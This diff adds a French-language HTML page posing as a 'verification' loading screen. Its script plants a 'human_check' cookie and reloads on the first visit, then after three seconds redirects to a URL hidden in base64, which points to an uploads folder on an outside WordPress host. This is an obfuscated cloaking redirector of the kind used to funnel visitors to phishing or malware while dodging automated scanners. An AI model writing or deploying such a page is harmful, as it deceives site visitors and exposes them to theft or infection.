@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Vérification...</title>
+</head>
+<body>
+<p>Chargement...</p>
+
+<script>
+function setCookie(name, value, days) {
+  const d = new Date();
+  d.setTime(d.getTime() + (days*24*60*60*1000));
+  document.cookie = name + "=" + value + ";expires=" + d.toUTCString() + ";path=/";
+}
+
+function getCookie(name) {
+  const cname = name + "=";
+  const ca = document.cookie.split(';');
+  for(let c of ca) {
+    while (c.charAt(0) == ' ') c = c.substring(1);
+    if (c.indexOf(cname) == 0) return c.substring(cname.length, c.length);
+  }
+  return "";
+}
+
+const encoded = "aHR0cHM6Ly93b3JkcHJlc3MtMjA4NTUxLTAuY2xvdWRjbHVzdGVycy5uZXQvd3AtY29udGVudC91cGxvYWRzLzIwMjYvMDIvZGlzL29vaA==";
+
+if (getCookie("human_check")) {
+    // Cookie déjà présent → redirection
+    setTimeout(() => {
+        window.location.replace(atob(encoded));
+    }, 3000);
+} else {
+    // Première visite → on pose le cookie
+    setCookie("human_check", "ok", 1);
+    location.reload();
+}
+</script>
+
+</body>
+</html>
